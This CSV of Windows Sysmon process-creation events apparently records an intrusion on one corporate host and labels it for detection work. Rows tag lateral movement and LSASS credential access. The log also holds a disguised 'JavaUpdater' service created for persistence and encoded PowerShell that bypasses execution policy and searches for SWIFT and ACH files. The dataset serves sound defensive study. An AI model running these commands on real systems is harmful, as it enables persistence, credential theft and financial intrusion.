datetime,subject,raw,pid,ppid,process_name,parent_process_name,cmdline,user,report_desc,mitre_tactic
2022-08-05 22:00:05+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:00:05.210061900Z""/>
    <EventRecordID>136095</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1428"" ThreadID=""1916""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-10.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:00:05.054</Data>
    <Data Name=""ProcessGuid"">{140A6FA9-92E5-62ED-0000-001009569E01}</Data>
    <Data Name=""ProcessId"">4860</Data>
    <Data Name=""Image"">\\127.0.0.1\ADMIN$\27f96ba.exe</Data>
    <Data Name=""FileVersion"">?</Data>
    <Data Name=""Description"">?</Data>
    <Data Name=""Product"">?</Data>
    <Data Name=""Company"">?</Data>
    <Data Name=""CommandLine"">\\127.0.0.1\ADMIN$\27f96ba.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=322C3BCA32697C473B04F8EEF068BF84,IMPHASH=DE77F3139EAF74F1B255AB7BE0B6605F</Data>
    <Data Name=""ParentProcessGuid"">{140A6FA9-6517-62ED-0000-00107C940000}</Data>
    <Data Name=""ParentProcessId"">508</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
  </EventData>
</Event>
",4860,508,\\127.0.0.1\ADMIN$\27f96ba.exe,C:\Windows\System32\services.exe,\\127.0.0.1\ADMIN$\27f96ba.exe,NT AUTHORITY\SYSTEM,,
2022-08-05 22:00:06+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:00:06.152225500Z""/>
    <EventRecordID>136100</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1428"" ThreadID=""1916""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-10.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:00:06.152</Data>
    <Data Name=""ProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
    <Data Name=""ProcessId"">1604</Data>
    <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=51138BEEA3E2C21EC44D0932C71762A8,IMPHASH=EF8A44FE2F9AD4AB85E55004AAA024A9</Data>
    <Data Name=""ParentProcessGuid"">{140A6FA9-92E5-62ED-0000-001009569E01}</Data>
    <Data Name=""ParentProcessId"">4860</Data>
    <Data Name=""ParentImage"">\\127.0.0.1\ADMIN$\27f96ba.exe</Data>
    <Data Name=""ParentCommandLine"">\\127.0.0.1\ADMIN$\27f96ba.exe</Data>
  </EventData>
</Event>
",1604,4860,C:\Windows\SysWOW64\rundll32.exe,\\127.0.0.1\ADMIN$\27f96ba.exe,C:\Windows\System32\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to move laterally,Lateral Movement
2022-08-05 22:01:56+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:01:56.159353000Z""/>
    <EventRecordID>136744</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1428"" ThreadID=""1916""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-10.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:01:56.143</Data>
    <Data Name=""ProcessGuid"">{140A6FA9-9354-62ED-0000-0010139DA301}</Data>
    <Data Name=""ProcessId"">7012</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
    <Data Name=""ParentProcessId"">1604</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",7012,1604,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
2022-08-05 22:05:57+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:05:57.429914400Z""/>
    <EventRecordID>137709</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1428"" ThreadID=""1916""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-10.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:05:57.383</Data>
    <Data Name=""ProcessGuid"">{140A6FA9-9445-62ED-0000-00104856AB01}</Data>
    <Data Name=""ProcessId"">2812</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
    <Data Name=""ParentProcessId"">1604</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",2812,1604,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
2022-08-05 22:12:18+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:12:18.484964700Z""/>
    <EventRecordID>139028</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1428"" ThreadID=""1916""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-10.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:12:18.469</Data>
    <Data Name=""ProcessGuid"">{140A6FA9-95C2-62ED-0000-00105F3BB401}</Data>
    <Data Name=""ProcessId"">4324</Data>
    <Data Name=""Image"">C:\Windows\SysWOW64\cmd.exe</Data>
    <Data Name=""FileVersion"">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
    <Data Name=""Description"">Windows Command Processor</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /C sc create JavaUpdater binPath= ""C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"" start= auto DisplayName= ""Java Updater""</Data>
    <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Java\jre7\bin\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=AD7B9C14083B52BC532FBA5948342B98,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163</Data>
    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
    <Data Name=""ParentProcessId"">1604</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",4324,1604,C:\Windows\SysWOW64\cmd.exe,C:\Windows\SysWOW64\rundll32.exe,"C:\Windows\system32\cmd.exe /C sc create JavaUpdater binPath= ""C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"" start= auto DisplayName= ""Java Updater""",NT AUTHORITY\SYSTEM,,
2022-08-05 22:12:18+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:12:18.563126200Z""/>
    <EventRecordID>139029</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1428"" ThreadID=""1916""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-10.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:12:18.547</Data>
    <Data Name=""ProcessGuid"">{140A6FA9-95C2-62ED-0000-0010D841B401}</Data>
    <Data Name=""ProcessId"">4168</Data>
    <Data Name=""Image"">C:\Windows\SysWOW64\sc.exe</Data>
    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">A tool to aid in developing services for WindowsNT</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">sc  create JavaUpdater binPath= ""C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"" start= auto DisplayName= ""Java Updater""</Data>
    <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Java\jre7\bin\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=D2F7A0ADC2EE0F65AB1F19D2E00C16B8,IMPHASH=8B24AF806035DDC8FD70B1C3134CCC3E</Data>
    <Data Name=""ParentProcessGuid"">{140A6FA9-95C2-62ED-0000-00105F3BB401}</Data>
    <Data Name=""ParentProcessId"">4324</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\cmd.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\cmd.exe /C sc create JavaUpdater binPath= ""C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"" start= auto DisplayName= ""Java Updater""</Data>
  </EventData>
</Event>
",4168,4324,C:\Windows\SysWOW64\sc.exe,C:\Windows\SysWOW64\cmd.exe,"sc  create JavaUpdater binPath= ""C:\Program Files (x86)\Java\jre7\bin\JavaUpdater.exe"" start= auto DisplayName= ""Java Updater""",NT AUTHORITY\SYSTEM,,
2022-08-05 22:13:07+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:13:07.173021000Z""/>
    <EventRecordID>139101</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1428"" ThreadID=""1916""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-10.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:13:07.157</Data>
    <Data Name=""ProcessGuid"">{140A6FA9-95F3-62ED-0000-0010DF86B401}</Data>
    <Data Name=""ProcessId"">4448</Data>
    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
    <Data Name=""Description"">Windows PowerShell</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=</Data>
    <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Java\jre7\bin\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
    <Data Name=""ParentProcessId"">1604</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",4448,1604,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=,NT AUTHORITY\SYSTEM,,
2022-08-05 22:13:54+00:00,ACC-10,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:13:54.162969700Z""/>
    <EventRecordID>139173</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1428"" ThreadID=""1916""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-10.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:13:54.147</Data>
    <Data Name=""ProcessGuid"">{140A6FA9-9622-62ED-0000-0010C3C4BC01}</Data>
    <Data Name=""ProcessId"">4516</Data>
    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
    <Data Name=""Description"">Windows PowerShell</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=</Data>
    <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Java\jre7\bin\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{140A6FA9-6517-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
    <Data Name=""ParentProcessGuid"">{140A6FA9-92E6-62ED-0000-0010DA999E01}</Data>
    <Data Name=""ParentProcessId"">1604</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",4516,1604,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=,NT AUTHORITY\SYSTEM,,
